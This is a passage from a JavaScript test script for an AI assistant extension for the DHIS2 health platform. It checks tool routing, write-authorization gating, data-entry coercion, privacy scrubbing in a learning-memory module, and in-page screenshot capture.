    eq('a single UID is left alone', heal('optionSets/qP6eFxS2QfQ?fields=id', 'GET'), 'optionSets/qP6eFxS2QfQ?fields=id');
    eq('a non-UID comma list is left alone', heal('dataValueSets/a,b?x=1', 'GET'), 'dataValueSets/a,b?x=1');
    eq('a sub-resource path is left alone', heal('programs/aGaF9TXsyTp,zGa7MSw6vwt/metadata', 'GET'), 'programs/aGaF9TXsyTp,zGa7MSw6vwt/metadata');
    eq('non-GET is never rewritten', heal('optionSets/qP6eFxS2QfQ,G26Oi8VjeXV', 'POST'), 'optionSets/qP6eFxS2QfQ,G26Oi8VjeXV');
    eq('a plain collection path is untouched', heal('optionSets?fields=id', 'GET'), 'optionSets?fields=id');
    truthy('an existing filter is kept alongside the id filter',
      (decodeURIComponent(heal('dataElements/aGaF9TXsyTp,zGa7MSw6vwt?filter=name:like:x', 'GET')).match(/filter=/g) || []).length === 2);
  }

  // ── Every routable tool must be presentable in the side panel ─────────────
  // The panel renders a tool card from two lookup tables plus a detail
  // formatter. A tool missing from them fell through to a generic fallback
  // that read "Querying DHIS2" — so manage_line_lists rendered exactly like a
  // raw dhis2_query call and looked like a tool-router misroute (live
  // 2026-08-02). The maps are hand-maintained, so pin them to TOOL_ROUTER.
  console.log('\nSide-panel tool presentation:');
  {
    const router = ctx.__TOOL_ROUTER;
    const panelSrc = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.js'), 'utf8');
    const block = (re, what) => {
      const m = panelSrc.match(re);
      if (!m) { bad(`sidepanel/panel.js — could not locate ${what}`); return null; }
      return new Set([...m[1].matchAll(/^\s*(\w+)\s*:/gm)].map((x) => x[1]));
    };
    const iconKeys = block(/const iconMap = \{([\s\S]*?)\n\s*\};/, 'iconMap');
    const labelKeys = block(/const toolLabels = \{([\s\S]*?)\n\s*\};/, 'toolLabels');
    const detailKeys = new Set(
      [...panelSrc.matchAll(/tool === '(\w+)'/g)].map((m) => m[1]));
    if (!router || typeof router !== 'object') {
      bad('TOOL_ROUTER not exposed to the verifier');
    } else {
      const names = Object.keys(router);
      const missing = (set, what) => {
        if (!set) return;
        const gaps = names.filter((n) => !set.has(n));
        if (gaps.length) bad(`${what} is missing: ${gaps.join(', ')}`);
        else ok(`${what} covers all ${names.length} routable tools`);
      };
      missing(iconKeys, 'panel iconMap');
      missing(labelKeys, 'panel toolLabels');
      // render_chart is matched via an `isChart` flag, not a `tool ===` test,
      // and dhis2_query's args.path fallback is already meaningful.
      const detailExempt = new Set(['render_chart']);
      const detailGaps = names.filter((n) => !detailKeys.has(n) && !detailExempt.has(n));
      if (detailGaps.length) bad(`panel detail formatter has no branch for: ${detailGaps.join(', ')}`);
      else ok(`panel detail formatter covers all ${names.length} routable tools`);
    }
    // 2.8.40 panel refresh (checked in real Chrome; these keep the pieces in place).
    const html = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.html'), 'utf8');
    const css = fs.readFileSync(path.join(ROOT, 'sidepanel/panel.css'), 'utf8');
    const t = (label, cond) => (cond ? ok(label) : bad(label));
    t('settings are split into General / Web browsing / Memory tabs, each with its panel',
      ['general', 'web', 'memory'].every((n) => html.includes(`data-tab="${n}"`) && html.includes(`id="settings-panel-${n}"`))
      && /id="settings-panel-general"[\s\S]*id="theme-select"[\s\S]*id="provider-select"[\s\S]*advanced-toggle[\s\S]*id="settings-panel-web"[\s\S]*id="tavily-api-key-input"[\s\S]*id="settings-panel-memory"[\s\S]*id="memory-enabled-toggle"/.test(html));
    t('the welcome screen suggests dashboards, apps, dashboard plugins and form-field plugins (filled into the input, not sent)',
      ['dashboard', 'app', 'plugin', 'form-plugin'].every((k) => html.includes(`data-kind="${k}"`)) && !/How many patients are enrolled\?/.test(html)
      && /example-btn[\s\S]{0,400}chatInput\.value = btn\.dataset\.prompt/.test(panelSrc) && !/example-btn[\s\S]{0,600}sendMessage\(\)/.test(panelSrc.slice(panelSrc.indexOf('// Example prompts'), panelSrc.indexOf('// Example prompts') + 700)));
    t('a reply that streams words and then calls tools is settled (no cursor left blinking)',
      /function showToolCall\([^)]*\) \{\s*removeThinking\(\);\s*settleStreamingBubble\(\);/.test(panelSrc) && /function handleStreamStart\(\) \{[\s\S]{0,120}settleStreamingBubble\(\);/.test(panelSrc));
    t('tool steps of one run share a collapsible group, closed when the reply starts',
      /currentToolGroup\(\)/.test(panelSrc) && /function markAllToolsDone\(\) \{[\s\S]*?closeToolGroups\(\);\s*\}/.test(panelSrc) && /\.tool-group\s*\{/.test(css));
    t('charts on screen are redrawn when the theme changes', /function applyTheme\([\s\S]{0,700}buildChartOption\(c\._spec\)/.test(panelSrc) && /chart\._spec = normalizedSpec/.test(panelSrc));
    t('save and error colours, tables and charts use theme tokens (readable in dark mode)',
      /\.key-status\.key-saved \{[^}]*var\(--success-text\)/.test(css) && /\.chart-header \{[^}]*var\(--surface-2\)/.test(css) && /\.md-table td \{[^}]*overflow-wrap: normal/.test(css) && !/border: 2px solid #64748b/.test(css));
  }

  const missingTarget = need('actionMissingFieldTarget');
  if (missingTarget) {
    eq('HIDEFIELD with no target is refused', missingTarget('HIDEFIELD', {}), true);
    eq('HIDEFIELD with a DE passes', missingTarget('HIDEFIELD', { dataElement: { id: 'x' } }), false);
    eq('SETMANDATORYFIELD with a TEA passes', missingTarget('SETMANDATORYFIELD', { trackedEntityAttribute: { id: 'x' } }), false);
    eq('ASSIGN to a variable via content passes', missingTarget('ASSIGN', { content: '#{v}' }), false);
    eq('ASSIGN with no target and no content is refused', missingTarget('ASSIGN', {}), true);
    eq('HIDEOPTION without the option is refused', missingTarget('HIDEOPTION', { dataElement: { id: 'x' } }), true);
    eq('HIDEOPTION with option + DE passes', missingTarget('HIDEOPTION', { dataElement: { id: 'x' }, option: { id: 'o' } }), false);
    eq('SHOWWARNING without a DE still passes (legal)', missingTarget('SHOWWARNING', {}), false);
  }
}

// ── Administration tools (src/tools-admin.js) + 2026-10-20 fixes ──────────────
if (loaded) {
  console.log('\nAdministration tools & 2026-10-20 fixes:');
  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
  const eq = (label, got, want) => {
    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
  };
  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing`); return f; };

  // Imperative write verbs authorize; the same verbs inside a complaint do not.
  const cwa = need('classifyWriteAuthorization');
  if (cwa) {
    eq('"Enter 12 malaria cases for January…" authorizes', cwa('Enter 12 malaria cases for January 2026 at Agouza').scope, 'broad');
    eq('"Reset Jane\'s password…" authorizes', cwa("Reset Jane's password to Abc12345!").scope, 'broad');
    eq('"please mark the September form complete" authorizes', cwa('please mark the September form complete').scope, 'broad');
    eq('"When I enter data and then submit the form it fails" stays read_only', cwa('When I enter data and then submit the form it fails').scope, 'read_only');
    eq('"If I mark it complete the values disappear" stays read_only', cwa('If I mark it complete the values disappear').scope, 'read_only');
    eq('"why can\'t I enter values?" stays read_only', cwa("why can't I enter values?").scope, 'read_only');
  }

  // Rule-action key aliases land on the canonical keys.
  const nra = need('normalizeRuleActionAliases');
  if (nra) {
    const a1 = nra({ type: 'HIDEFIELD', data_element: 'Sample ID' });
    eq('data_element:"Sample ID" → data_element_name', a1.data_element_name, 'Sample ID');
    const a2 = nra({ action_type: 'SHOWWARNING', dataElement: { id: 'a3kGcGpz8FJ' }, message: 'Low' });
    eq('dataElement:{id} → data_element_id (+type, +content)', [a2.data_element_id, a2.type, a2.content], ['a3kGcGpz8FJ', 'SHOWWARNING', 'Low']);
    const a3 = nra({ type: 'SETMANDATORYFIELD', attribute: 'National ID' });
    eq('attribute:"National ID" → tracked_entity_attribute_name', a3.tracked_entity_attribute_name, 'National ID');
    const a4 = nra({ type: 'HIDEFIELD', data_element_name: 'Keep me', data_element: 'Not me' });
    eq('an explicit canonical key is never overwritten', a4.data_element_name, 'Keep me');
    const a5 = nra({ type: 'HIDEFIELD', field: 'Temperature' });
    eq('UID-shaped English word "Temperature" stays a NAME', [a5.data_element_name, a5.data_element_id], ['Temperature', undefined]);
  }
  const cat = need('canonicalizeActionTargetNames');
  if (cat) {
    const act = { data_element_name: 'national id' };
    cat(act, ['Weight'], ['National ID']);
    eq('a TEA name given as data_element_name moves to the attribute key', [act.tracked_entity_attribute_name, act.data_element_name], ['National ID', undefined]);
  }

  // Routing: metadata translation vs app-UI translation are disjoint.
  // (Fresh thread — the sticky-tool checks above left tools "used".)
  try { ctx.__dhis2().toolsUsedThisThread = []; } catch { /* older bundle */ }
  const gct = need('getContextualTools');
  if (gct) {
    const names = (ctxObj, text) => gct(ctxObj, text, false, null).map((t) => t.function.name);
    let n = names({ appType: 'Maintenance' }, 'translate the TB program and its data elements into French');
    eq('"translate the TB program…" → manage_metadata_translations', n.includes('manage_metadata_translations'), true);
    eq('…and NOT the app-UI string tool', n.includes('manage_custom_translations'), false);
    n = names({ appType: 'Capture' }, 'translate the Capture app buttons to Arabic');
    eq('"translate the Capture app buttons" → manage_custom_translations', n.includes('manage_custom_translations'), true);
    n = names({ appType: 'Dashboard' }, 'create a user account for Jane with the data entry role');
    eq('"create a user account…" → manage_users', n.includes('manage_users'), true);
    n = names({ appType: 'Dashboard' }, 'share this dashboard with all users');
    eq('"share … with all users" does NOT surface manage_users', n.includes('manage_users'), false);
    n = names({ appType: 'Aggregate Data Entry', datasetId: 'a3kGcGpz8FJ' }, 'what is missing here?');
    eq('Data Entry app → manage_data_values', n.includes('manage_data_values'), true);
    n = names({ appType: 'Dashboard' }, 'enter 12 malaria cases in the monthly dataset for January 2026 at Agouza');
    eq('"enter … monthly dataset … January" → manage_data_values', n.includes('manage_data_values'), true);
    n = names({ appType: 'Capture', programId: 'a3kGcGpz8FJ' }, 'enter a new event for this patient');
    eq('tracker data entry does NOT surface manage_data_values', n.includes('manage_data_values'), false);
  }

  // Aggregate value coercion / periods / disaggregation matching.
  const npi = need('normalizePeriodInput');
  if (npi) {
    eq('"January 2026" (Monthly) → 202601', npi('Monthly', 'January 2026'), '202601');
    eq('"2026-03" (Monthly) → 202603', npi('Monthly', '2026-03'), '202603');
    eq('"Q2 2026" (Quarterly) → 2026Q2', npi('Quarterly', 'Q2 2026'), '2026Q2');
    eq('"2026 week 3" (Weekly) → 2026W3', npi('Weekly', '2026 week 3'), '2026W3');
  }
  const po = need('periodOrdinal');
  if (po) eq('Monthly ordinal 202601 - 202512 = 1', po('Monthly', '202601') - po('Monthly', '202512'), 1);
  const cdv = need('coerceDataValue');
  if (cdv) {
    eq('INTEGER_ZERO_OR_POSITIVE "-2" refused', !!cdv({ valueType: 'INTEGER_ZERO_OR_POSITIVE' }, '-2').problem, true);
    eq('BOOLEAN "yes" → "true"', cdv({ valueType: 'BOOLEAN' }, 'yes').value, 'true');
    eq('option NAME → code', cdv({ valueType: 'TEXT', optionSet: { options: [{ code: 'LOW', displayName: 'Low' }] } }, 'low').value, 'LOW');
    eq('unknown option refused', !!cdv({ valueType: 'TEXT', optionSet: { options: [{ code: 'LOW', displayName: 'Low' }] } }, 'Plenty').problem, true);
    eq('NUMBER "1,250" → "1250"', cdv({ valueType: 'NUMBER' }, '1,250').value, '1250');
  }
  const mc = need('matchCoc');
  if (mc) {
    const cocs = [{ id: 'aaaaaaaaaa1', displayName: 'Female, <5', categoryOptions: [{ displayName: 'Female' }, { displayName: '<5' }] },
                  { id: 'aaaaaaaaaa2', displayName: 'Male, <5', categoryOptions: [{ displayName: 'Male' }, { displayName: '<5' }] }];
    eq('COC by option names in any order', (mc(cocs, '<5, Female') || {}).id, 'aaaaaaaaaa1');
    eq('COC by option array', (mc(cocs, ['<5', 'Male']) || {}).id, 'aaaaaaaaaa2');
    eq('"Female, 5+" does NOT match "Female, <5" (symbols kept)', mc(cocs, 'Female, 5+'), null);
    const ages = [{ id: 'bbbbbbbbbb1', displayName: '<5', categoryOptions: [{ displayName: '<5' }] }, { id: 'bbbbbbbbbb2', displayName: '5+', categoryOptions: [{ displayName: '5+' }] }];
    eq('"5+" resolves to the 5+ band', (mc(ages, '5+') || {}).id, 'bbbbbbbbbb2');
    eq('"<5" resolves to the <5 band', (mc(ages, '<5') || {}).id, 'bbbbbbbbbb1');
  }
  const hdv = need('hardenDataValueSetsPath');
  if (hdv) {
    eq('raw dataValueSets import gets strictPeriods', /strictPeriods=true/.test(hdv('dataValueSets')), true);
    eq('explicit strictPeriods=false is respected', /strictPeriods=false/.test(hdv('dataValueSets?strictPeriods=false')), true);
    eq('DELETE strategy left untouched', hdv('dataValueSets?importStrategy=DELETE'), 'dataValueSets?importStrategy=DELETE');
  }

  // Users: password policy + username shape.
  const cp = need('checkPassword');
  if (cp) {
    eq('"Abc12345!" passes the policy', cp('Abc12345!', { min: 8, max: 72 }).length, 0);
    eq('"Abcdefgh!" lacks a digit', cp('Abcdefgh!', { min: 8, max: 72 }).some((p) => /digit/.test(p)), true);
    const gp = need('generateStrongPassword');
    if (gp) eq('generated password satisfies the policy', cp(gp(14), { min: 8, max: 72 }).length, 0);
  }
  const cu = need('checkUsername');
  if (cu) { eq('"zz_ok-name.1" is a valid username', cu('zz_ok-name.1'), null); eq('"Bad Name" refused', !!cu('Bad Name'), true); }

  // Indicator types by factor.
  const iif = need('impliedIndicatorFactor');
  if (iif) {
    eq('"Per cent" → factor 100', (iif('Per cent') || {}).factor, 100);
    eq('"%" → factor 100', (iif('%') || {}).factor, 100);
    eq('"per 100,000" → factor 100000', (iif('per 100,000') || {}).factor, 100000);
    eq('"Number (Factor 1)" → factor 1', (iif('Number (Factor 1)') || {}).factor, 1);
  }

  // Aggregate-data delete block → data-pruning hint names the right UID.
  const adh = need('aggregateDataBlockHint');
  if (adh) eq('hint carries the DE UID from a metadata DELETE body', /dataPruning\/dataElements\/Sdn2X0UkIQL/.test(adh('metadata?importStrategy=DELETE {"dataElements":[{"id":"Sdn2X0UkIQL"}]}')), true);
}

// ── Learning memory (src/memory.js) ──────────────────────────────────────────
// Async block: every await below resolves on the microtask queue, which drains
// before the setImmediate verdict.
if (loaded) (async () => {
  console.log('\nLearning memory:');
  const fn = (n) => (typeof ctx[n] === 'function' ? ctx[n] : null);
  const eq = (label, got, want) => {
    if (JSON.stringify(got) === JSON.stringify(want)) ok(`${label} => ${JSON.stringify(got)}`);
    else bad(`${label} => ${JSON.stringify(got)} (expected ${JSON.stringify(want)})`);
  };
  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
  const need = (n) => { const f = fn(n); if (!f) bad(`${n} — missing`); return f; };
  const st = ctx.__memoryState && ctx.__memoryState();
  if (!st) { bad('memoryState not exposed'); return; }
  await ctx.ensureMemoryLoaded();
  st.entries = [];
  st.enabled = true;

  // Scrubbing: identifiers and personal values never reach storage.
  const scrub = need('scrubMemoryText');
  if (scrub) {
    eq('UIDs → <uid>', scrub('tracker/trackedEntities/a3kGcGpz8FJ failed for CcHoHIzjuVo'), 'tracker/trackedEntities/<uid> failed for <uid>');
    eq('API words like programType survive', scrub('set programType and periodTypes'), 'set programType and periodTypes');
    eq('e-mail → <email>', scrub('sent to jane.doe@moh.gov.sl'), 'sent to <email>');
    eq('phone → <number>', scrub('call +232 76 123 456'), 'call <number>');
    eq('dates → <date>', scrub('born 1990-04-12'), 'born <date>');
    eq('filter values → <value>', scrub('GET trackedEntities?filter=w75KJ2mc4zz:eq:Fatmata'), 'GET trackedEntities?filter=<uid>:eq:<value>');
    eq('monthly period id survives, long ids do not', scrub('period 202601 id 12345678'), 'period 202601 id <number>');
    eq('server URL reduced to path', scrub('https://play.dhis2.org/api/42/dashboards/abc?x=1'), '/api/dashboards/abc?x=1');
  }
  const personal = need('looksLikePersonalData');
  if (personal) {
    eq('"patient named Fatmata" is personal', personal('the patient named Fatmata could not enroll'), true);
    eq('"Mrs Kamara" is personal', personal('record of Mrs Kamara'), true);
    eq('"first name: Ali" is personal', personal('first name: Ali'), true);
    eq('an API lesson is not personal', personal('PATCH users/<uid> /userGroups returns 500; use userGroups/<g>/users/<u>'), false);
  }

  // Recording through the tool: validation, privacy refusal, merge.
  const mm = need('executeManageMemory');
  if (mm) {
    let r = await mm({ action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'Add tiles with add_items, never PUT the dashboard', problem: 'A PUT dashboards/<uid> with only the new item wiped every existing tile.', solution: 'Use manage_dashboards(action="add_items", dashboard_id, items=[{visualization_id}]) — it appends and snapshots first.' });
    truthy('record a dashboard lesson', r.success && r.id);
    r = await mm({ action: 'record', area: 'dashboards', tools: ['manage_dashboards'], title: 'Use add_items to add tiles, never PUT the dashboard', problem: 'PUT dashboards wiped every existing tile', solution: 'manage_dashboards add_items appends safely.' });
    eq('a near-duplicate lesson MERGES (no second entry)', [r.merged_with_existing, st.entries.length], [true, 1]);
    r = await mm({ action: 'record', area: 'tracker_data', title: 'Enrollment for the patient named Fatmata fails', solution: 'Use a different date for Fatmata Kamara please' });
    truthy('a lesson with personal data is REFUSED', r._error && /personal/.test(r._error));
    await mm({ action: 'record', area: 'indicators', tools: ['manage_indicators'], title: 'Percent indicator type is named Percentage here', problem: 'indicator_type "Per cent" does not exist on this server', solution: 'Pass indicator_type:"Percentage" (factor 100) for percentages.', scope: 'instance' });
    await mm({ action: 'record', area: 'line_lists', tools: ['manage_line_lists'], title: 'Line list PI columns must not divide', problem: 'A division PI as a column was refused', solution: 'Use a row-safe SUM program indicator as the column.' });
    eq('three distinct lessons stored', st.entries.length, 3);
  }

  // Retrieval is task-aware.
  const block = need('buildMemoryPromptBlock');
  if (block) {
    const txt = block('create an ANC coverage indicator as a percentage then put it on a dashboard', ['manage_indicators', 'manage_dashboards', 'dhis2_query']);
    truthy('prompt block carries the indicator lesson', /Percentage/.test(txt));
    truthy('prompt block carries the dashboard lesson', /add_items/.test(txt));
    truthy('prompt block leaves out the unrelated line-list lesson', !/division PI/.test(txt));
    const none = block('how many enrollments last month?', ['count_records', 'dhis2_query']);
    truthy('an unrelated request gets no lessons (just the search pointer)', !/add_items|Percentage/.test(none));
  }
  const lf = need('memoryLessonsFor');
  if (lf) {
    const l = lf({ tool: 'manage_dashboards', args: { action: 'add_items' }, userText: 'add a chart' });
    truthy('manual-gate lessons for manage_dashboards found', l.length === 1 && /add_items/.test(l[0]));
  }

  // Automatic capture: failure → fix in one turn becomes a lesson.
  const begin = need('memoryBeginTurn'), observe = need('memoryObserveCall'), end = need('memoryEndTurn');
  if (begin && observe && end) {
    const before = st.entries.length;
    begin('create an indicator', { appType: 'Maintenance' }, new Set(['manage_indicators', 'manage_memory']));
    observe('manage_indicators', { action: 'create', indicator: { name: 'X', indicator_type: 'Per thousand', numerator: '#{a}', denominator: '#{b}' } },
      { _error: 'No indicatorType named "Per thousand".', _hint: 'Use one of this instance\'s types: "Percentage" (factor 100).' });
    const o = observe('manage_indicators', { action: 'create', indicator: { name: 'X', indicator_type: 'Percentage', numerator: '#{a}', denominator: '#{b}' } }, { success: true, indicator_id: 'a3kGcGpz8FJ' });
    truthy('recovery nudges the model to record the lesson', o.note && /manage_memory/.test(o.note));
    await end();
    const auto = st.entries.find(e => e.source === 'auto');
    eq('an automatic lesson was written', st.entries.length, before + 1);
    truthy('…naming the exact change (indicator_type Per thousand → Percentage)', auto && /indicator_type: Per thousand → Percentage/.test(auto.solution));
    truthy('…without the indicator NAME or expression values', auto && !/#\{a\}/.test(JSON.stringify(auto)));

    // Gate refusals are not lessons.
    const n1 = st.entries.length;
    begin('delete it', { appType: 'Maintenance' }, new Set());
    observe('manage_metadata', { action: 'delete' }, { _error: 'Refused: not authorized', _scope: 'requires_user_confirmation' });
    observe('manage_metadata', { action: 'delete' }, { success: true });
    await end();
    eq('write-auth refusals never become lessons', st.entries.length, n1);
    // Reporting Completeness Explorer thread (2026-11-10): both were saved as binding lessons.
    begin('build and install an app, show me a summary before installing', { appType: 'Dashboard' }, new Set(['manage_custom_app', 'manage_memory']));
    observe('manage_custom_app', { action: 'preview', name: 'X' }, { _error: 'JSX does not compile: app.jsx:437:10 Unexpected token', compile_errors: [{ file: 'app.jsx', line: 437 }], _hint: 'Fix exactly these lines (see frame) and resend the whole call. Common causes: an unclosed JSX tag.' });
    observe('manage_custom_app', { action: 'preview', name: 'X' }, { preview: true, preview_token: 'pv-1' });
    observe('manage_custom_app', { action: 'create', key: 'ai-x' }, { _error: 'Not installed: the preview was made in this same turn and the user has not approved it yet.', _hint: 'Do not call create again this turn — it will be refused the same way. End the turn: show the user the preview summary.', _awaiting_approval: true });
    observe('manage_metadata', { action: 'update_sharing' }, { _error: 'Not changed: the user did not ask to share this dashboard.', _hint: 'Leave sharing as created (the owner and admins can open it).', _scope: 'sharing_not_requested' });
    await end();
    eq('a compile error, an approval pause and an unasked-sharing refusal never become lessons', st.entries.length, n1);

    // Privacy taint: a turn that touched patient records writes NOTHING.
    begin('fix the enrollment', { appType: 'Capture', teiId: 'a3kGcGpz8FJ', programId: 'CcHoHIzjuVo' }, new Set(['manage_memory']));
    truthy('a patient-record page taints the turn', !!ctx.__memoryTurn().taint);
    observe('create_metadata', { action: 'add_stage' }, { _error: 'E4000 missing name' });
    observe('create_metadata', { action: 'add_stage' }, { success: true });
    const refused = await mm({ action: 'record', area: 'programs', title: 'Stages need a name always', solution: 'Always send the stage name field.' });
    await end();
    eq('tainted turn: no automatic lesson', st.entries.length, n1);
    truthy('tainted turn: manage_memory(record) refused', refused._error && /patient-level/.test(refused._error));
    begin('list people', { appType: 'Maintenance' }, new Set());
    observe('dhis2_query', { path: 'tracker/trackedEntities?program=CcHoHIzjuVo' }, { _error: 'Refused by hard privacy safeguard', _privacy_block: true });
    truthy('a patient-data read attempt taints the turn', !!ctx.__memoryTurn().taint);
    await end();
    begin('create a person', { appType: 'Maintenance' }, new Set());
    observe('dhis2_query', { path: 'tracker?async=false', method: 'POST', body: { trackedEntities: [] } }, { success: true });
    truthy('a tracker WRITE taints the turn', !!ctx.__memoryTurn().taint);
    await end();
  }

  // "remember …" in the USER's words makes the recorded lesson a user rule.
  if (mm) {
    vm.runInContext('lastUserText = "Please remember for the future: always use LAST_12_MONTHS on charts";', ctx);
    let r = await mm({ action: 'record', area: 'visualizations', tools: ['manage_dashboards'], title: 'Charts always use LAST_12_MONTHS here', solution: 'Set periods ["LAST_12_MONTHS"] on every chart.' });
    eq('"remember …" from the user → source user (user rule)', r.lesson && r.lesson.source, 'user');
    vm.runInContext('lastUserText = "make a chart of malaria";', ctx);
    r = await mm({ action: 'record', area: 'maps', tools: ['manage_maps'], title: 'Maps need an org unit level for districts', solution: 'Pass org_unit_level 2 for districts on this hierarchy.' });
    eq('a self-learned lesson stays source assistant', r.lesson && r.lesson.source, 'assistant');
  }

  // Search tool + on/off switch.
  if (mm) {
    const r = await mm({ action: 'search', query: 'dashboard tiles wiped' });
    truthy('search finds the dashboard lesson', r.success && r.lessons?.[0]?.area === 'dashboards');
  }
  const gct = fn('getContextualTools');
  if (gct) {
    truthy('manage_memory is offered while memory is ON', gct({ appType: 'Dashboard' }, 'make a chart', false).some(t => t.function.name === 'manage_memory'));
    st.enabled = false;
    truthy('manage_memory is withheld while memory is OFF', !gct({ appType: 'Dashboard' }, 'make a chart', false).some(t => t.function.name === 'manage_memory'));
    eq('no prompt block while memory is OFF', block ? block('put it on a dashboard', ['manage_dashboards']) : '', '');
    begin && begin('x', {}, new Set());
    const n2 = st.entries.length;
    observe && observe('manage_indicators', { action: 'create' }, { _error: 'boom' });
    observe && observe('manage_indicators', { action: 'create' }, { success: true });
    end && await end();
    eq('nothing is learned while memory is OFF', st.entries.length, n2);
    st.enabled = true;
  }
  st.entries = [];
})().catch((e) => bad(`learning-memory checks threw: ${e && e.stack || e}`));

// ── Screenshot capture (src/agent.js) ────────────────────────────────────────
// The manifest declares neither activeTab nor <all_urls>, so captureVisibleTab
// is refused: the background must hand capture to the injected overlay, which
// executeScript SERIALIZES — it may only use what it defines itself, so it runs
// here from its source text in a fresh context with a minimal DOM. Microtask-
// only (no real timers), like the block above. A handler that never answers
// would leave this block pending forever, so the verdict also checks it finished.
let screenshotChecksDone = false;
if (loaded) (async () => {
  console.log('\nScreenshot capture (no activeTab / <all_urls>):');
  const truthy = (label, got) => (got ? ok(`${label}`) : bad(`${label} => ${JSON.stringify(got)}`));
  const flush = async () => { for (let i = 0; i < 50; i++) await Promise.resolve(); };
  const listener = messageListeners[0];
  if (!listener || typeof ctx.injectedScreenshotSelection !== 'function') { bad('screenshot handler / injectedScreenshotSelection missing'); return; }

  // Background message handling.
  const sent = [];
  chrome.runtime.sendMessage = (m) => { sent.push(m); return Promise.resolve(); };
  const fromTab = { id: 'verify', tab: { id: 7, windowId: 1 } };
  const call = (msg, sender = fromTab) => new Promise((resolve) => {
    if (listener(msg, sender, resolve) !== true) resolve(undefined);
  });
  chrome.tabs.captureVisibleTab = () => Promise.reject(new Error("Either the '<all_urls>' or 'activeTab' permission is required."));
  const r = await call({ type: 'SCREENSHOT_AREA_SELECTED', payload: { x: 1, y: 1, width: 50, height: 50, devicePixelRatio: 1 } });
  truthy('captureVisibleTab refused → overlay told to capture in-page', r && r.captureInPage === true);
  truthy('…with no error shown for the refused fast path', !sent.length);
  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' });
  truthy('in-page PNG is relayed to the panel as SCREENSHOT_RESULT', sent.length === 1 && sent[0].type === 'SCREENSHOT_RESULT');
  sent.length = 0;
  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:text/html;base64,PGI+' });
  await call({ type: 'SCREENSHOT_CAPTURED', dataUrl: 'data:image/png;base64,iVBORw0KGgo=' }, { id: 'verify' });
  truthy('non-PNG data / a sender that is not a tab is dropped', !sent.length);
  await call({ type: 'SCREENSHOT_FAILED', reason: 'NotAllowedError', error: 'Permission denied' });
  truthy('cancelled share prompt → SCREENSHOT_ERROR (not AI_ERROR, which ends a streaming reply) naming Allow',
    sent[0]?.type === 'SCREENSHOT_ERROR' && /Allow/.test(sent[0].error));
  delete chrome.runtime.sendMessage;
  delete chrome.tabs.captureVisibleTab;

  // The injected overlay, from its serialized source.
  const src = ctx.injectedScreenshotSelection.toString();
  const page = ({ activation = true, response = { captureInPage: true }, getDisplayMedia } = {}) => {
    const msgs = [];
    const t = { stopped: false, gdmCalls: 0, overlayGoneAtCapture: null, drawn: null };
    const el = (tag) => {
      const e = {
        tag, id: '', style: {}, children: [], listeners: {},
        addEventListener(type, f) { (this.listeners[type] ||= []).push(f); },
        appendChild(c) { this.children.push(c); c.parent = this; },
        remove() { if (this.parent) this.parent.children = this.parent.children.filter((x) => x !== this); },
        fire(type, ev = {}) { for (const f of this.listeners[type] || []) f({ preventDefault: noop, ...ev }); },
      };
      if (tag === 'video') e.play = async () => { e.videoWidth = 2000; e.videoHeight = 1488; };
      if (tag === 'canvas') {
        e.getContext = () => ({ drawImage: (...a) => { t.drawn = a.slice(1); } });
        e.toDataURL = () => 'data:image/png;base64,QUJD';
      }
      return e;
    };
    const body = el('body');
    const track = { getSettings: () => ({ displaySurface: 'browser' }), stop: () => { t.stopped = true; } };
    const gdm = getDisplayMedia || (async () => {
      t.gdmCalls++;
      t.overlayGoneAtCapture = !body.children.length;
      return { getVideoTracks: () => [track], getTracks: () => [track] };
    });
    const win = {
      document: { body, createElement: el, getElementById: (id) => body.children.find((c) => c.id === id) || null, addEventListener: noop, removeEventListener: noop },
      innerWidth: 1000, innerHeight: 800, devicePixelRatio: 2,
      navigator: { userActivation: { isActive: activation }, mediaDevices: getDisplayMedia === null ? undefined : { getDisplayMedia: gdm } },
      chrome: { runtime: { sendMessage: (m) => { msgs.push(m); return Promise.resolve(m.type === 'SCREENSHOT_AREA_SELECTED' ? response : undefined); } } },
      setTimeout: (f) => Promise.resolve().then(f),
    };
    win.window = win;
    vm.runInContext(`(${src})()`, vm.createContext(win));
    const overlay = body.children[0];
    const drag = () => {
      overlay.fire('mousedown', { clientX: 100, clientY: 50 });
      overlay.fire('mousemove', { clientX: 300, clientY: 200 });
      overlay.fire('mouseup', { clientX: 400, clientY: 250 });
    };
    return { t, msgs, body, drag };
  };

  let p = page();
  p.drag();
  await flush();
  truthy('overlay is self-contained: runs from its serialized source', p.msgs.some((m) => m.type === 'SCREENSHOT_AREA_SELECTED'));
  truthy('in-page capture starts only after the overlay is removed', p.t.gdmCalls === 1 && p.t.overlayGoneAtCapture === true);
  truthy('crop maps CSS px → frame px by width (DPR 2: 100,50 300×200 → 200,100 600×400)',
    JSON.stringify(p.t.drawn) === JSON.stringify([200, 100, 600, 400, 0, 0, 600, 400]));
  truthy('cropped PNG sent as SCREENSHOT_CAPTURED and the stream stopped',
    p.msgs.some((m) => m.type === 'SCREENSHOT_CAPTURED' && m.dataUrl === 'data:image/png;base64,QUJD') && p.t.stopped);

  p = page({ response: { ok: true } });
  p.drag();
  await flush();
  truthy('prompt-free path succeeded → no tab-capture prompt', p.t.gdmCalls === 0);

  p = page({ activation: false });
  p.drag();
  await flush();
  const btn = p.body.children.find((c) => c.id === '__dhis2_screenshot_confirm__');
  truthy('expired user activation (slow drag) → "Capture selection" button, no prompt yet', btn && p.t.gdmCalls === 0);
  btn && btn.fire('click');
  await flush();
  truthy('…clicking it captures and removes the button', p.t.gdmCalls === 1 && !p.body.children.length);

  p = page({ getDisplayMedia: async () => { throw Object.assign(new Error('Permission denied'), { name: 'NotAllowedError' }); } });
  p.drag();
  await flush();
  truthy('cancelled prompt → SCREENSHOT_FAILED NotAllowedError', p.msgs.some((m) => m.type === 'SCREENSHOT_FAILED' && m.reason === 'NotAllowedError'));

  p = page({ getDisplayMedia: null });
  p.drag();
  await flush();
